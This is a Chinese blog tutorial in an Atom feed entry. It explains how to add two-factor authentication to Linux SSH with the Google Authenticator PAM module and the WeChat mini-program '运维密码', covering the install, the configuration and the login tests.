    <id>http://blog.unixmen.cn/2017/03/29/通过运维密码实现Linux系统SSH双因子认证/</id>
    <published>2017-03-29T00:38:24.000Z</published>
    <updated>2017-03-29T03:21:56.094Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通过运维密码实现Linux系统SSH双因子认证"><a href="#通过运维密码实现Linux系统SSH双因子认证" class="headerlink" title="通过运维密码实现Linux系统SSH双因子认证"></a>通过运维密码实现Linux系统SSH双因子认证</h1><h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><p>本文讲述了如果通过Linux.中国提供的微信小程序”运维密码”结合 Google身份验证器”<a href="https://github.com/google/google-authenticator" target="_blank" rel="noopener">Google Authenticator</a>“实现Linux系统OpenSSH双因子认证对SSH进行安全加固。</p><h2 id="前言-背景"><a href="#前言-背景" class="headerlink" title="前言/背景"></a>前言/背景</h2><p>近来很多知名企业都出现了密码泄露，业内对多重认证的呼声也越来越高。</p><h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><ul><li>什么是双因子认证</li></ul><p>双因子认证（Two-factor authentication，也叫2FA），是一种通过组合两种不同的验证方式进行用户身份验证的机制。</p><ul><li><p>在这种多重认证的系统中，用户需要通过两种不同的认证程序：</p><ul><li><p>提供他们知道的信息（如 用户名/密码）</p></li><li><p>再借助其他工具提供用户所不知道的信息（如用手机生成的一次性密码）</p></li></ul></li></ul><h2 id="SSH双因子认证实现思路"><a href="#SSH双因子认证实现思路" class="headerlink" title="SSH双因子认证实现思路"></a>SSH双因子认证实现思路</h2><p>使用“运维密码”结合“Google身份验证器”及Linux系统“OpenSSH”双因子认证对SSH进行安全加固。</p><ul><li>关于Google 身份验证器</li></ul><p>为了鼓励广泛采用双因子认证的方式，Google 公司发布了 Google 身份验证器<a href="https://github.com/google/google-authenticator" target="_blank" rel="noopener">Google Authenticator</a>，一款开源的，可基于开放规则（如 HMAP/ 基于时间）生成一次性密码的软件。这是一款跨平台软件，可运行在 Linux、 Android、 iOS。Google 公司同时也支持插件式鉴别模块PAM （pluggable authentication module），使其能和其他也适用 PAM 进行验证的工具（如 OpenSSH）协同工作。</p><ul><li>关于运维密码</li></ul><p>Linux.中国社区长期接触互联网新技术的最前沿，洞察大势所趋，身兼新技术广泛传播及维护互联网安全的重任，以及方便运维及新技术的传播开发了运维密码小程序。</p><h2 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h2><p>首先我们需要一些准备工作：</p><ul><li><p>一台运行着 OpenSSH 服务版本大于6.2的 Linux 主机</p></li><li><p>一台能运行微信的智能手机</p></li><li><p>一台支持SSH登陆的终端</p></li></ul><h2 id="在-Linux-系统中安装-Google-身份验证器"><a href="#在-Linux-系统中安装-Google-身份验证器" class="headerlink" title="在 Linux 系统中安装 Google 身份验证器"></a>在 Linux 系统中安装 Google 身份验证器</h2><p>第一步需要在运行着 OpenSSH 服务的 Linux 主机上安装 Google 身份验证器。按照如下步骤安装 Google 身份验证器及其PAM模块。</p><h3 id="用安装包安装-Google-身份验证器"><a href="#用安装包安装-Google-身份验证器" class="headerlink" title="用安装包安装 Google 身份验证器"></a>用安装包安装 Google 身份验证器</h3><p>如果你不想自己构建 Google 身份验证器，在几个 Linux 发行版上有已经编译好的安装包。安装包里面包含 Google 身份验证器 二进制程序和 PAM 模块。</p><ul><li>在 Ubuntu 上安装 Google 身份验证器：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt-get install libpam-google-authenticator</span><br></pre></td></tr></table></figure><ul><li>在 Fedora 上安装 Google 身份验证器：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo dnf install google-authenticator</span><br></pre></td></tr></table></figure><ul><li>在 CentOS 上安装 Google 身份验证器：</li></ul><p>在 CentOS 上安装 Google 身份验证器 ，需要首先启用 EPEL 软件库，然后运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo yum install google-authenticator</span><br></pre></td></tr></table></figure><h3 id="编译安装-Google-身份验证器"><a href="#编译安装-Google-身份验证器" class="headerlink" title="编译安装 Google 身份验证器"></a>编译安装 Google 身份验证器</h3><p>首先，安装构建 Google 身份验证器所需的软件包。</p><ul><li>在 Debian、 Ubuntu 或 Linux Mint 上：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt-get install wget make gcc libpam0g-dev</span><br></pre></td></tr></table></figure><ul><li>在 CentOS、 Fedora 或 RHEL上：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo yum install wget make gcc pam-devel</span><br></pre></td></tr></table></figure><ul><li>然后下载 Google 身份验证器的源代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git clone https://github.com/google/google-authenticator.git</span><br></pre></td></tr></table></figure><ul><li>编译安装Google 身份验证器：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd google-authenticator/libpam</span><br><span class="line"></span><br><span class="line">./bootstrap.sh</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>如果构建成功，你会在目录中看到 pam_google_authenticator.so 和 google-authenticator 两个文件。</p><p>最后，将 Google 身份验证器安装到合适位置。默认会安装到 /usr/local/lib/security 下，根据你的系统不同，你可能需要将其符号链接到 pam 库的位置（比如 CentOS 7 会在 /usr/lib64/security）。如下图所示：</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gamod.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>至此，Google 身份验证器安装完成。</p><h2 id="配置Google-身份验证器及运维密码"><a href="#配置Google-身份验证器及运维密码" class="headerlink" title="配置Google 身份验证器及运维密码"></a>配置Google 身份验证器及运维密码</h2><p>完成Google 身份验证器的安装我们仅仅完成了第一步，接着需要对Google 身份验证器、运维密码、SSH进行配置才能达到我们预期的效果。</p><h3 id="配置google-authenticator及生成验证密钥"><a href="#配置google-authenticator及生成验证密钥" class="headerlink" title="配置google-authenticator及生成验证密钥"></a>配置google-authenticator及生成验证密钥</h3><ul><li>使用（以下）命令生成验证密钥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">google-authenticator</span><br></pre></td></tr></table></figure><ul><li><p>生成验证密钥的时候，会再次确认信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Do you want authentication tokens to be time-based (y/n)</span><br></pre></td></tr></table></figure><p>意思是：你想要生产基于时间生成验证码吗？这里需要需要输入y</p></li></ul><p>输入y之后你将看到一个二维码，它使用如下二维码图形格式表示我们数字形态的密钥。注：一会我们要用到它在运维密码上完成配置。</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/erweima.png" alt=""></p><ul><li><p>紧急验证码<br>在生成密钥的同时还生成了5个8位的紧急密码，当然，也是一次性使用的，请妥善保存，以备不时之需。</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/emergency.png" alt=""></p></li></ul><ul><li><p>保存Google Authenticator配置文件</p><p>Google Authenticator 虽然运行了，但是相关设置还没有保存，接下来会提示保存：</p><p>意思是：你想将配置文件写入到“/root/.google_authenticator”保存吗？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n)</span><br></pre></td></tr></table></figure><p>输入y回车</p></li></ul><ul><li><p>禁止同一令牌多用途登陆</p><p>意思是：你是否要禁用同一密钥多用途登陆，这将限制你每30秒只能登陆一次，这将增加接收提醒的机会，甚至能够防止中间人攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> Do you want to disallow multiple uses of the same authentication</span><br><span class="line"></span><br><span class="line">token? This restricts you to one login about every 30s, but it increases</span><br><span class="line"></span><br><span class="line">your chances to notice or even prevent man-in-the-middle attacks (y/n)</span><br></pre></td></tr></table></figure><p>输入y回车</p></li></ul><ul><li><p>时间容错设置</p><p>意思是:默认情况下，密钥在30秒内有效，为了防止由于客户端与服务器时间偏移（时间相差太大）导致认证失败，google authenticator设计时间容错措施。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> By default, tokens are good for 30 seconds. In order to compensate for</span><br><span class="line"></span><br><span class="line">possible time-skew between the client and the server, we allow an extra</span><br><span class="line"></span><br><span class="line">token before and after the current time. If you experience problems with</span><br><span class="line"></span><br><span class="line">poor time synchronization, you can increase the window from its default</span><br><span class="line"></span><br><span class="line">size of +-1min (window size of 3) to about +-4min (window size of</span><br><span class="line"></span><br><span class="line">17 acceptable tokens).</span><br><span class="line"></span><br><span class="line">Do you want to do so? (y/n)</span><br></pre></td></tr></table></figure><p>这个可根据实际情况进行配置。</p></li></ul><ul><li><p>暴力破解防护</p><p>意思是：在你的电脑存在暴力破解的情况下可开启身份认证次数限制模块，默认限制为：30秒内不超过三次登陆尝试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> If the computer that you are logging into isn&apos;t hardened against brute-force</span><br><span class="line"></span><br><span class="line">login attempts, you can enable rate-limiting for the authentication module.</span><br><span class="line"></span><br><span class="line">By default, this limits attackers to no more than 3 login attempts every 30s.</span><br><span class="line"></span><br><span class="line">Do you want to enable rate-limiting (y/n)</span><br></pre></td></tr></table></figure><p>输入y回车</p></li></ul><ul><li><p>配置完成</p><p>配置完成后会在home目录下生成一个权限为400的隐藏文件，如下图所示：</p></li></ul><p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/configfile.png" alt=""></p><h3 id="配置运维密码"><a href="#配置运维密码" class="headerlink" title="配置运维密码"></a>配置运维密码</h3><ul><li>打开微信小程序</li></ul><p>打开微信，依次点击发现，小程序</p><p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/lp.jpg" alt=""></p><ul><li><p>输入“运维密码”并搜索</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/search.jpg" alt=""></p></li></ul><ul><li><p>点击“运维密码”进入应用</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/search.jpg" alt=""></p></li></ul><ul><li><p>点击右下角二维码图标</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/button.png" alt=""></p></li></ul><ul><li>扫一扫配置google-authenticator时所生成的二维码</li></ul><ul><li><p>点击确定添加场景</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/commit.jpg" alt=""></p></li></ul><ul><li><p>添加完成</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/adddone.jpg" alt=""></p></li></ul><h3 id="配置SSH服务"><a href="#配置SSH服务" class="headerlink" title="配置SSH服务"></a>配置SSH服务</h3><ul><li>添加认证模块</li></ul><p>在/etc/pam.d/sshd文件添加认证模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">echo &quot;auth required pam_google_authenticator.so&quot; &gt;&gt;/etc/pam.d/sshd</span><br></pre></td></tr></table></figure><ul><li>配置任何的密码认证</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sed -i &apos;s/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/g&apos; /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><ul><li>重启sshd服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure><h2 id="测试登陆"><a href="#测试登陆" class="headerlink" title="测试登陆"></a>测试登陆</h2><p>以上配置完成基本上就搞定了，下面我们进行测试。</p><h3 id="登陆测试"><a href="#登陆测试" class="headerlink" title="登陆测试"></a>登陆测试</h3><ul><li>输入命令登陆主机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh root@10.112.2.3</span><br></pre></td></tr></table></figure><ul><li>首先输入服务器的密码,接着会让输入运维密码。</li></ul><p>运维密码可在小程序中查看。</p><p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/onetime.jpg" alt=""></p><p>如下图：</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/logintest.png" alt=""></p><p>我们可以看到，在登陆的时候，需要配合“运维密码”才能登陆服务器。</p><ul><li>公钥登陆测试</li></ul><p>如果使用公钥登陆呢？以上配置是不是也是需要配合运维密码才能登陆的，我们进行验证：</p><ul><li>首先，我们将本机的公钥复制到远程机器的authorized_keys文件中。 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh-copy-id root@10.112.2.3</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/ssh-copy-id.png" alt=""></p><ul><li>登陆测试</li></ul><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/logintest.png" alt=""></p><p>我们可以看到，不需要输入任何密码，直接登陆到了系统。</p><h3 id="结合运维密码配置增强型SSH安全选项"><a href="#结合运维密码配置增强型SSH安全选项" class="headerlink" title="结合运维密码配置增强型SSH安全选项"></a>结合运维密码配置增强型SSH安全选项</h3><p>针对上面公钥登陆的测试，如果还任我不是很安全，我们可以设定如下登陆场景：公钥+密码+运维密码，我们需要如何做呢？</p><ul><li>配置SSH公钥双因子</li></ul><p>修改/etc/ssh/sshd_config配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">echo &quot;AuthenticationMethods publickey,keyboard-interactive:pam&quot; &gt;&gt;/etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><ul><li>重启SSH服务</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure><ul><li>登陆测试</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh root@10.112.2.3</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/pamssh.png" alt=""></p><p>可以看到，登陆的时候是需要验证公钥，密码，及输入运维密码才能登陆到系统。</p><ul><li><p>没有密钥的情况下尝试登陆测试,如下图</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/nopublickey.png" alt=""></p></li></ul><p>至此，本文结束，如有错误及不足欢迎指正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;通过运维密码实现Linux系统SSH双因子认证&quot;&gt;&lt;a href=&quot;#通过运维密码实现Linux系统SSH双因子认证&quot; class=&quot;headerlink&quot; title=&quot;通过运维密码实现Linux系统SSH双因子认证&quot;&gt;&lt;/a&gt;通过运维密码实现Linux系统SS
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="双因子认证" scheme="http://blog.unixmen.cn/tags/%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/"/>
    
      <category term="SSH安全加固" scheme="http://blog.unixmen.cn/tags/SSH%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
      <category term="运维密码" scheme="http://blog.unixmen.cn/tags/%E8%BF%90%E7%BB%B4%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
</feed>
